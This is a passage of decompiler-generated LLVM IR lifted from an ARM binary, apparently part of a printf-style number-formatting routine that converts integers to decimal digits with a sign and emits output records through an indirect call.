  br i1 %v2_f890, label %dec_label_pc_f8ac, label %dec_label_pc_f8bc

dec_label_pc_f8ac:                                ; preds = %bb262
  store i32 %v1_f934, i32* %r3.global-to-local, align 4
  %v0_f8b0 = load i32, i32* %sl.global-to-local, align 4
  %v1_f8b0 = add i32 %v0_f8b0, -103
  %v3_f8b0 = sub i32 102, %v0_f8b0
  %v4_f8b0 = and i32 %v3_f8b0, %v0_f8b0
  %v5_f8b0 = icmp slt i32 %v4_f8b0, 0
  store i1 %v5_f8b0, i1* %cpsr_v.global-to-local, align 1
  %v6_f8b0 = icmp slt i32 %v1_f8b0, 0
  store i1 %v6_f8b0, i1* %cpsr_n.global-to-local, align 1
  %v7_f8b0 = icmp eq i32 %v0_f8b0, 103
  store i1 %v7_f8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8b0, label %dec_label_pc_f8d8, label %bb263

bb263:                                            ; preds = %dec_label_pc_f8ac
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_f8b4 = icmp slt i32 %v1_f934, 0
  store i1 %v2_f8b4, i1* %cpsr_n.global-to-local, align 1
  %v3_f8b4 = icmp eq i32 %v1_f934, 0
  store i1 %v3_f8b4, i1* %cpsr_z.global-to-local, align 1
  %tmp264 = icmp slt i32 %v1_f934, 1
  br i1 %tmp264, label %dec_label_pc_f8d8, label %dec_label_pc_f8bc

dec_label_pc_f8bc:                                ; preds = %.thread40, %bb262, %bb263
  %v2_f8c0 = inttoptr i32 %v1_f8c0 to i32*
  store i32 112, i32* %v2_f8c0, align 4
  %v1_f8c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_f8c8 = add i32 %v1_f8c8, 4
  %v3_f8c8 = inttoptr i32 %v2_f8c8 to i32*
  store i32 1, i32* %v3_f8c8, align 4
  store i32 ptrtoint (i32* @global_var_155b4.679 to i32), i32* %r3.global-to-local, align 4
  %v1_f8d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f8d0 = add i32 %v1_f8d0, 8
  %v3_f8d0 = inttoptr i32 %v2_f8d0 to i32*
  store i32 ptrtoint (i32* @global_var_155b4.679 to i32), i32* %v3_f8d0, align 4
  %v0_f8d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f8d4 = add i32 %v0_f8d4, 12
  store i32 %v1_f8d4, i32* %r6.global-to-local, align 4
  %v0_f8d8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f8d8

dec_label_pc_f8d8:                                ; preds = %dec_label_pc_f8ac, %bb263, %dec_label_pc_f8bc
  %v1_f8e4 = phi i32 [ %v1_f8c0, %bb263 ], [ %v1_f8d4, %dec_label_pc_f8bc ], [ %v1_f8c0, %dec_label_pc_f8ac ]
  %v0_f8d8 = phi i32 [ %v0_f8d8110, %bb263 ], [ %v0_f8d8.pre, %dec_label_pc_f8bc ], [ %v0_f8d8110, %dec_label_pc_f8ac ]
  %v1_f8d8 = add i32 %v0_f8d8, 1
  store i32 %v1_f8d8, i32* %ip.global-to-local, align 4
  %v3_f8d8 = sub i32 0, %v0_f8d8
  %v4_f8d8 = and i32 %v1_f8d8, %v3_f8d8
  %v5_f8d8 = icmp slt i32 %v4_f8d8, 0
  store i1 %v5_f8d8, i1* %cpsr_v.global-to-local, align 1
  %v6_f8d8 = icmp slt i32 %v1_f8d8, 0
  store i1 %v6_f8d8, i1* %cpsr_n.global-to-local, align 1
  %v7_f8d8 = icmp eq i32 %v1_f8d8, 0
  store i1 %v7_f8d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8d8, label %dec_label_pc_f8fc, label %dec_label_pc_f8e0

dec_label_pc_f8e0:                                ; preds = %dec_label_pc_f8d8
  %v1_f8e0 = sub i32 -1, %v0_f8d8
  %v2_f8e4 = add i32 %v1_f8e4, 4
  %v3_f8e4 = inttoptr i32 %v2_f8e4 to i32*
  store i32 %v1_f8e0, i32* %v3_f8e4, align 4
  store i32 ptrtoint (i32* @global_var_155a7.677 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_f8f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f8f0 = inttoptr i32 %v1_f8f0 to i32*
  store i32 176, i32* %v2_f8f0, align 4
  %v0_f8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f8f4 = add i32 %v1_f8f4, 8
  %v3_f8f4 = inttoptr i32 %v2_f8f4 to i32*
  store i32 %v0_f8f4, i32* %v3_f8f4, align 4
  %v0_f8f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_f8f8 = add i32 %v0_f8f8, 12
  store i32 %v1_f8f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f8fc

dec_label_pc_f8fc:                                ; preds = %dec_label_pc_f8d8, %dec_label_pc_f8e0
  %v2_f904 = phi i32 [ %v1_f8e4, %dec_label_pc_f8d8 ], [ %v1_f8f8, %dec_label_pc_f8e0 ]
  %v0_f8fc = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f8fc = icmp slt i32 %v0_f8fc, 0
  store i1 %v1_f8fc, i1* %cpsr_n.global-to-local, align 1
  %v2_f8fc = icmp eq i32 %v0_f8fc, 0
  store i1 %v2_f8fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8fc, label %.thread49, label %bb265

bb265:                                            ; preds = %dec_label_pc_f8fc
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_f904 = inttoptr i32 %v2_f904 to i32*
  store i32 112, i32* %v3_f904, align 4
  %v1_f908 = load i32, i32* %r4.global-to-local, align 4
  %v2_f908 = load i32, i32* %r6.global-to-local, align 4
  %v3_f908 = add i32 %v2_f908, 8
  %v4_f908 = inttoptr i32 %v3_f908 to i32*
  store i32 %v1_f908, i32* %v4_f908, align 4
  %v1_f90c = load i32, i32* %r1.global-to-local, align 4
  %v2_f90c = load i32, i32* %r6.global-to-local, align 4
  %v3_f90c = add i32 %v2_f90c, 4
  %v4_f90c = inttoptr i32 %v3_f90c to i32*
  store i32 %v1_f90c, i32* %v4_f90c, align 4
  %v1_f910 = load i32, i32* %r6.global-to-local, align 4
  %v2_f910 = add i32 %v1_f910, 12
  store i32 %v2_f910, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_f8fc, %bb265
  %v1_f938 = phi i32 [ %v2_f904, %dec_label_pc_f8fc ], [ %v2_f910, %bb265 ]
  %v0_f914 = load i32, i32* %sl.global-to-local, align 4
  %v1_f914 = add i32 %v0_f914, -103
  %v3_f914 = sub i32 102, %v0_f914
  %v4_f914 = and i32 %v3_f914, %v0_f914
  %v5_f914 = icmp slt i32 %v4_f914, 0
  store i1 %v5_f914, i1* %cpsr_v.global-to-local, align 1
  %v6_f914 = icmp slt i32 %v1_f914, 0
  store i1 %v6_f914, i1* %cpsr_n.global-to-local, align 1
  %v7_f914 = icmp eq i32 %v0_f914, 103
  store i1 %v7_f914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f914, label %dec_label_pc_f91c, label %dec_label_pc_f924

dec_label_pc_f91c:                                ; preds = %.thread49
  %v0_f91c = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f91c = icmp slt i32 %v0_f91c, 0
  store i1 %v1_f91c, i1* %cpsr_n.global-to-local, align 1
  %v2_f91c = icmp eq i32 %v0_f91c, 0
  store i1 %v2_f91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f91c, label %dec_label_pc_f950, label %dec_label_pc_f924

dec_label_pc_f924:                                ; preds = %.thread49, %dec_label_pc_f91c
  %v0_f924 = load i32, i32* %ip.global-to-local, align 4
  %v1_f924 = load i32, i32* %r1.global-to-local, align 4
  %v2_f924 = sub i32 %v1_f924, %v0_f924
  store i32 %v2_f924, i32* %r3.global-to-local, align 4
  store i32 %v1_f934, i32* %ip.global-to-local, align 4
  %v2_f92c = sub i32 %v2_f924, %v1_f934
  %v4_f92c = xor i32 %v2_f924, %v1_f934
  %v5_f92c = xor i32 %v2_f92c, %v2_f924
  %v6_f92c = and i32 %v5_f92c, %v4_f92c
  %v7_f92c = icmp slt i32 %v6_f92c, 0
  store i1 %v7_f92c, i1* %cpsr_v.global-to-local, align 1
  %v8_f92c = icmp slt i32 %v2_f92c, 0
  store i1 %v8_f92c, i1* %cpsr_n.global-to-local, align 1
  %v9_f92c = icmp eq i32 %v2_f924, %v1_f934
  store i1 %v9_f92c, i1* %cpsr_z.global-to-local, align 1
  %v2_f930 = xor i1 %v8_f92c, %v7_f92c
  br i1 %v2_f930, label %dec_label_pc_f934, label %dec_label_pc_f950

dec_label_pc_f934:                                ; preds = %dec_label_pc_f924
  %v2_f934 = sub i32 %v1_f934, %v2_f924
  %v2_f938 = add i32 %v1_f938, 4
  %v3_f938 = inttoptr i32 %v2_f938 to i32*
  store i32 %v2_f934, i32* %v3_f938, align 4
  store i32 ptrtoint (i32* @global_var_155a7.677 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_f944 = load i32, i32* %r6.global-to-local, align 4
  %v2_f944 = inttoptr i32 %v1_f944 to i32*
  store i32 176, i32* %v2_f944, align 4
  %v0_f948 = load i32, i32* %r3.global-to-local, align 4
  %v1_f948 = load i32, i32* %r6.global-to-local, align 4
  %v2_f948 = add i32 %v1_f948, 8
  %v3_f948 = inttoptr i32 %v2_f948 to i32*
  store i32 %v0_f948, i32* %v3_f948, align 4
  %v0_f94c = load i32, i32* %r6.global-to-local, align 4
  %v1_f94c = add i32 %v0_f94c, 12
  store i32 %v1_f94c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f950

dec_label_pc_f950:                                ; preds = %dec_label_pc_f924, %dec_label_pc_f91c, %dec_label_pc_f934
  %v1_f9e4.pre.pre = phi i32 [ %v1_f938, %dec_label_pc_f924 ], [ %v1_f938, %dec_label_pc_f91c ], [ %v1_f94c, %dec_label_pc_f934 ]
  %v0_f950 = load i32, i32* %r7.global-to-local, align 4
  %v1_f950 = add i32 %v0_f950, -102
  %v3_f950 = sub i32 101, %v0_f950
  %v4_f950 = and i32 %v3_f950, %v0_f950
  %v5_f950 = icmp slt i32 %v4_f950, 0
  store i1 %v5_f950, i1* %cpsr_v.global-to-local, align 1
  %v6_f950 = icmp slt i32 %v1_f950, 0
  store i1 %v6_f950, i1* %cpsr_n.global-to-local, align 1
  %v7_f950 = icmp eq i32 %v0_f950, 102
  store i1 %v7_f950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f950, label %dec_label_pc_f9d8, label %dec_label_pc_f958

dec_label_pc_f958:                                ; preds = %dec_label_pc_f950
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f95c = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f95c = icmp slt i32 %v0_f95c, 0
  store i1 %v1_f95c, i1* %cpsr_n.global-to-local, align 1
  %v2_f95c = icmp eq i32 %v0_f95c, 0
  store i1 %v2_f95c, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0131138, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_f970 = sub i32 0, %v0_f95c
  %storemerge180 = select i1 %v1_f95c, i32 %v4_f970, i32 %v0_f95c
  %tmp283 = ashr i32 %v0_f95c, 31
  %tmp284 = and i32 %tmp283, 2
  %tmp285 = add nuw nsw i32 %tmp284, 43
  store i32 %storemerge180, i32* %r4.global-to-local, align 4
  store i32 %tmp285, i32* %sl.global-to-local, align 4
  %v2_f978 = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_f978, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f980

dec_label_pc_f980:                                ; preds = %dec_label_pc_f9b0, %dec_label_pc_f980, %dec_label_pc_f958
  %v2_f998 = phi i32 [ %v2_f978, %dec_label_pc_f958 ], [ %v6_f998, %dec_label_pc_f980 ], [ %v6_f998, %dec_label_pc_f9b0 ]
  %v0_f994 = phi i32 [ %storemerge180, %dec_label_pc_f958 ], [ %v2_f99c, %dec_label_pc_f980 ], [ %v2_f99c, %dec_label_pc_f9b0 ]
  %v2_f988 = srem i32 %v0_f994, 10
  %v1_f98c = add nsw i32 %v2_f988, 48
  store i32 %v1_f98c, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_f994, i32* %r0.global-to-local, align 4
  %v1_f998 = trunc i32 %v1_f98c to i8
  %v3_f998 = add i32 %v2_f998, -1
  %v4_f998 = inttoptr i32 %v3_f998 to i8*
  store i8 %v1_f998, i8* %v4_f998, align 1
  %v5_f998 = load i32, i32* %r5.global-to-local, align 4
  %v6_f998 = add i32 %v5_f998, -1
  store i32 %v6_f998, i32* %r5.global-to-local, align 4
  %v0_f99c = load i32, i32* %r0.global-to-local, align 4
  %v1_f99c = load i32, i32* %r1.global-to-local, align 4
  %v2_f99c = sdiv i32 %v0_f99c, %v1_f99c
  store i32 %v2_f99c, i32* %r0.global-to-local, align 4
  %v0_f9a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f9a0 = add i32 %v0_f9a0, 1
  store i32 %v1_f9a0, i32* %r7.global-to-local, align 4
  %v1_f9a4 = add i32 %v0_f9a0, -2
  %v3_f9a4 = sub i32 1, %v0_f9a0
  %v4_f9a4 = and i32 %v3_f9a4, %v1_f9a0
  %v5_f9a4 = icmp slt i32 %v4_f9a4, 0
  store i1 %v5_f9a4, i1* %cpsr_v.global-to-local, align 1
  %v6_f9a4 = icmp slt i32 %v1_f9a4, 0
  store i1 %v6_f9a4, i1* %cpsr_n.global-to-local, align 1
  %v7_f9a4 = icmp eq i32 %v1_f9a0, 3
  store i1 %v7_f9a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_f99c, i32* %r4.global-to-local, align 4
  %v7_f9ac = icmp slt i32 %v1_f9a0, 4
  br i1 %v7_f9ac, label %dec_label_pc_f980, label %dec_label_pc_f9b0

dec_label_pc_f9b0:                                ; preds = %dec_label_pc_f980
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f9b0 = icmp slt i32 %v2_f99c, 0
  store i1 %v1_f9b0, i1* %cpsr_n.global-to-local, align 1
  %v2_f9b0 = icmp eq i32 %v2_f99c, 0
  store i1 %v2_f9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9b0, label %dec_label_pc_f9b8, label %dec_label_pc_f980

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f9b0
  %v1_f9b8 = add i32 %v5_f998, -2
  store i32 %v1_f9b8, i32* %r3.global-to-local, align 4
  %v0_f9bc = load i32, i32* %sl.global-to-local, align 4
  %v1_f9bc = trunc i32 %v0_f9bc to i8
  %v4_f9bc = inttoptr i32 %v1_f9b8 to i8*
  store i8 %v1_f9bc, i8* %v4_f9bc, align 1
  %v0_f9c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f9c0 = add i32 %v0_f9c0, -1
  store i32 %v1_f9c0, i32* %r2.global-to-local, align 4
  %v0_f9c4 = load i32, i32* %r8.global-to-local, align 4
  %v1_f9c4 = trunc i32 %v0_f9c4 to i8
  %v4_f9c4 = inttoptr i32 %v1_f9c0 to i8*
  store i8 %v1_f9c4, i8* %v4_f9c4, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_f9cc = load i32, i32* %r6.global-to-local, align 4
  %v1_f9cc = inttoptr i32 %v0_f9cc to i32*
  store i32 112, i32* %v1_f9cc, align 4
  %v3_f9cc = add i32 %v0_f9cc, 4
  %v4_f9cc = inttoptr i32 %v3_f9cc to i32*
  %v5_f9cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_f9cc, i32* %v4_f9cc, align 4
  %v0_f9d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f9d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f9d0 = add i32 %v1_f9d0, 8
  %v3_f9d0 = inttoptr i32 %v2_f9d0 to i32*
  store i32 %v0_f9d0, i32* %v3_f9d0, align 4
  %v0_f9d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f9d4 = add i32 %v0_f9d4, 12
  store i32 %v1_f9d4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f950, %.thread127, %dec_label_pc_f9b8
  %v1_f9e4.pre = phi i32 [ %v2_f490, %.thread127 ], [ %v1_f9d4, %dec_label_pc_f9b8 ], [ %v1_f9e4.pre.pre, %dec_label_pc_f950 ]
  %v2_f9d8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_f9d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f9dc, %dec_label_pc_f9d8
  %v0_f9dc = phi i32 [ %v2_f9d8, %dec_label_pc_f9d8 ], [ %v4_f9dc, %dec_label_pc_f9dc ]
  %stack_var_-188.0 = phi i32 [ %v3_f340, %dec_label_pc_f9d8 ], [ %v2_f9e8, %dec_label_pc_f9dc ]
  %v1_f9dc = inttoptr i32 %v0_f9dc to i32*
  %v2_f9dc = load i32, i32* %v1_f9dc, align 4
  store i32 %v2_f9dc, i32* %r3.global-to-local, align 4
  %v4_f9dc = add i32 %v0_f9dc, 12
  store i32 %v4_f9dc, i32* %r2.global-to-local, align 4
  %v3_f9e4 = icmp ult i32 %v4_f9dc, %v1_f9e4.pre
  %v2_f9e8 = sub i32 %stack_var_-188.0, %v2_f9dc
  store i32 %v2_f9e8, i32* %r0.global-to-local, align 4
  br i1 %v3_f9e4, label %dec_label_pc_f9dc, label %dec_label_pc_f9f4

dec_label_pc_f9f4:                                ; preds = %dec_label_pc_f9dc
  %v3_f9f4 = load i8, i8* %stack_var_-42, align 1
  %v4_f9f4 = sext i8 %v3_f9f4 to i32
  store i32 %v4_f9f4, i32* %r3.global-to-local, align 4
  store i32 %v4_f9f4, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f9f8 = icmp slt i8 %v3_f9f4, 0
  store i1 %v1_f9f8, i1* %cpsr_n.global-to-local, align 1
  %v2_f9f8 = icmp eq i8 %v3_f9f4, 0
  store i1 %v2_f9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9f8, label %bb270, label %bb269

bb269:                                            ; preds = %dec_label_pc_f9f4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb270

bb270:                                            ; preds = %dec_label_pc_f9f4, %bb269
  %v1_fa4c = phi i32 [ %v4_f9f4, %dec_label_pc_f9f4 ], [ 1, %bb269 ]
  %v2_fa00 = sub i32 %v2_f9e8, %v1_fa4c
  store i32 %v2_fa00, i32* %r1.global-to-local, align 4
  %v2_fa04 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_fa04, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_fa0c = icmp slt i32 %v2_fa00, 0
  store i1 %v1_fa0c, i1* %cpsr_n.global-to-local, align 1
  %v2_fa0c = icmp eq i32 %v2_fa00, 0
  store i1 %v2_fa0c, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp271 = icmp slt i32 %v2_fa00, 1
  br i1 %tmp271, label %dec_label_pc_fa74, label %dec_label_pc_fa20

dec_label_pc_fa20:                                ; preds = %bb270
  %v2_fa20 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_fa20, i32* %ip.global-to-local, align 4
  %v1_fa24 = add i32 %v2_fa20, 12
  %v2_fa24 = inttoptr i32 %v1_fa24 to i32*
  %v3_fa24 = load i32, i32* %v2_fa24, align 4
  store i32 %v3_fa24, i32* %r3.global-to-local, align 4
  %v1_fa28 = and i32 %v3_fa24, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fa28 = icmp eq i32 %v1_fa28, 0
  store i1 %v2_fa28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa28, label %dec_label_pc_fa40, label %dec_label_pc_fa30

dec_label_pc_fa30:                                ; preds = %dec_label_pc_fa20
  store i32 ptrtoint (i32* @global_var_155a7.677 to i32), i32* %r3.global-to-local, align 4
  %v1_fa34 = add i32 %v1_f9e4.pre, 12
  store i32 %v1_fa34, i32* %r5.global-to-local, align 4
  %v1_fa38 = inttoptr i32 %v1_f9e4.pre to i32*
  store i32 160, i32* %v1_fa38, align 4
  %v3_fa38 = add i32 %v1_f9e4.pre, 4
  %v4_fa38 = inttoptr i32 %v3_fa38 to i32*
  %v5_fa38 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_fa38, i32* %v4_fa38, align 4
  %v6_fa38 = add i32 %v1_f9e4.pre, 8
  %v7_fa38 = inttoptr i32 %v6_fa38 to i32*
  %v8_fa38 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_fa38, i32* %v7_fa38, align 4
  br label %dec_label_pc_fa78

dec_label_pc_fa40:                                ; preds = %dec_label_pc_fa20
  store i32 %v2_fa20, i32* %r0.global-to-local, align 4
  %v1_fa44 = add i32 %v2_fa20, 16
  %v2_fa44 = inttoptr i32 %v1_fa44 to i32*
  %v3_fa44 = load i32, i32* %v2_fa44, align 4
  store i32 %v3_fa44, i32* %r3.global-to-local, align 4
  %v1_fa48 = add i32 %v3_fa44, -48
  %v3_fa48 = sub i32 47, %v3_fa44
  %v4_fa48 = and i32 %v3_fa48, %v3_fa44
  %v5_fa48 = icmp slt i32 %v4_fa48, 0
  store i1 %v5_fa48, i1* %cpsr_v.global-to-local, align 1
  %v6_fa48 = icmp slt i32 %v1_fa48, 0
  store i1 %v6_fa48, i1* %cpsr_n.global-to-local, align 1
  %v7_fa48 = icmp eq i32 %v3_fa44, 48
  store i1 %v7_fa48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa48, label %dec_label_pc_fa58, label %bb272

bb272:                                            ; preds = %dec_label_pc_fa40
  store i32 %v2_f9e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa74

dec_label_pc_fa58:                                ; preds = %dec_label_pc_fa40
  %v3_fa58 = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_f9e4.pre, i32* %r5.global-to-local, align 4
  %v2_fa60 = add i32 %v3_fa58, %v2_fa00
  store i32 %v2_fa60, i32* %r3.global-to-local, align 4
  store i32 %v2_fa60, i32* %stack_var_-160, align 4
  br label %dec_label_pc_fa78

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa80
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fab0

dec_label_pc_fa74:                                ; preds = %bb272, %bb270
  store i32 %v1_f9e4.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fa78

dec_label_pc_fa78:                                ; preds = %dec_label_pc_fa58, %dec_label_pc_fa30, %dec_label_pc_fa74
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_fa7c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_fa7c, i32* %r4.global-to-local, align 4
  %v3_fa88.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_fa80

dec_label_pc_fa80:                                ; preds = %dec_label_pc_faa8, %dec_label_pc_fa78
  %v0_fa80 = phi i32 [ %v1_faa0, %dec_label_pc_faa8 ], [ %v2_fa7c, %dec_label_pc_fa78 ]
  %v1_fa80 = inttoptr i32 %v0_fa80 to i32*
  %v2_fa80 = load i32, i32* %v1_fa80, align 4
  store i32 %v2_fa80, i32* %r1.global-to-local, align 4
  %v3_fa80 = add i32 %v0_fa80, 4
  %v4_fa80 = inttoptr i32 %v3_fa80 to i32*
  %v5_fa80 = load i32, i32* %v4_fa80, align 4
  store i32 %v5_fa80, i32* %r2.global-to-local, align 4
  %v6_fa80 = add i32 %v0_fa80, 8
  %v7_fa80 = inttoptr i32 %v6_fa80 to i32*
  %v8_fa80 = load i32, i32* %v7_fa80, align 4
  store i32 %v8_fa80, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_fa88.pre, i32* @ip, align 4
  store i32 64148, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_fa88.pre)
  %v0_fa94 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa94 = add i32 %v0_fa94, 4
  %v2_fa94 = inttoptr i32 %v1_fa94 to i32*
  %v3_fa94 = load i32, i32* %v2_fa94, align 4
  store i32 %v3_fa94, i32* %r3.global-to-local, align 4
  %v0_fa98 = load i32, i32* %r0.global-to-local, align 4
  %v2_fa98 = sub i32 %v0_fa98, %v3_fa94
  %v4_fa98 = xor i32 %v0_fa98, %v3_fa94
  %v5_fa98 = xor i32 %v2_fa98, %v0_fa98
  %v6_fa98 = and i32 %v5_fa98, %v4_fa98
  %v7_fa98 = icmp slt i32 %v6_fa98, 0
  store i1 %v7_fa98, i1* %cpsr_v.global-to-local, align 1
  %v8_fa98 = icmp slt i32 %v2_fa98, 0
  store i1 %v8_fa98, i1* %cpsr_n.global-to-local, align 1
  %v9_fa98 = icmp eq i32 %v0_fa98, %v3_fa94
  store i1 %v9_fa98, i1* %cpsr_z.global-to-local, align 1
  %v0_fa9c = load i32, i32* %r6.global-to-local, align 4
  %v2_fa9c = add i32 %v0_fa9c, %v0_fa98
  store i32 %v2_fa9c, i32* %r6.global-to-local, align 4
  %v1_faa0 = add i32 %v0_fa94, 12
  store i32 %v1_faa0, i32* %r4.global-to-local, align 4
  br i1 %v9_fa98, label %dec_label_pc_faa8, label %dec_label_pc_fa6c

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa80
  %v1_faa8 = load i32, i32* %r5.global-to-local, align 4
  %v2_faa8 = sub i32 %v1_faa0, %v1_faa8
  %v3_faa8 = icmp ult i32 %v1_faa0, %v1_faa8
  %v4_faa8 = xor i32 %v1_faa8, %v1_faa0
  %v5_faa8 = xor i32 %v2_faa8, %v1_faa0
  %v6_faa8 = and i32 %v5_faa8, %v4_faa8
  %v7_faa8 = icmp slt i32 %v6_faa8, 0
  store i1 %v7_faa8, i1* %cpsr_v.global-to-local, align 1
  %v8_faa8 = icmp slt i32 %v2_faa8, 0
  store i1 %v8_faa8, i1* %cpsr_n.global-to-local, align 1
  %v9_faa8 = icmp eq i32 %v1_faa0, %v1_faa8
  store i1 %v9_faa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_faa8, label %dec_label_pc_fa80, label %dec_label_pc_fab0

dec_label_pc_fab0:                                ; preds = %dec_label_pc_faa8, %dec_label_pc_fa6c
  %v0_fab0 = phi i32 [ -1, %dec_label_pc_fa6c ], [ %v2_fa9c, %dec_label_pc_faa8 ]
  store i32 %v0_fab0, i32* %r0.global-to-local, align 4
  %v2_fab8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_fab8, i32* %r4.global-to-local, align 4
  ret i32 %v0_fab0

; uselistorder directives
  uselistorder i32 %v0_fab0, { 1, 0 }
  uselistorder i32 %v2_faa8, { 1, 0 }
  uselistorder i32 %v1_faa8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_faa0, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_fa98, { 1, 0 }
  uselistorder i32 %v0_fa98, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_fa94, { 2, 0, 1, 3 }
  uselistorder i32 %v0_fa80, { 2, 1, 0 }
  uselistorder i32 %v3_fa44, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_fa20, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f9e8, { 0, 1, 3, 2 }
  uselistorder i32 %v4_f9dc, { 1, 2, 0 }
  uselistorder i32 %v0_f9dc, { 1, 0 }
  uselistorder i32 %v1_f9e4.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_f99c, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_f998, { 2, 1, 0 }
  uselistorder i32 %storemerge180, { 1, 0 }
  uselistorder i32 %v0_f95c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_f950, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f92c, { 1, 0 }
  uselistorder i32 %v2_f924, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_f91c, { 1, 0 }
  uselistorder i32 %v0_f914, { 3, 0, 1, 2 }
  uselistorder i32 %v0_f8fc, { 1, 0 }
  uselistorder i32 %v1_f8d8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_f8d8, { 1, 0, 2 }
  uselistorder i32 %v0_f8b0, { 3, 0, 1, 2 }
  uselistorder i1 %v2_f890, { 2, 1, 0 }
  uselistorder i32 %v2_f81c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_f80c, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_f934, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_f878, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_f7b8, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_f79c, { 1, 0 }
  uselistorder i32 %v1_f794, { 1, 2, 0 }
  uselistorder i32 %v2_f788, { 1, 0 }
  uselistorder i32 %v1_f788, { 1, 2, 0, 3 }
  uselistorder i32 %v0_f788, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_f780, { 1, 0, 2 }
  uselistorder i32 %v0_f778, { 3, 0, 1, 2 }
  uselistorder i1 %v3_f758, { 1, 0 }
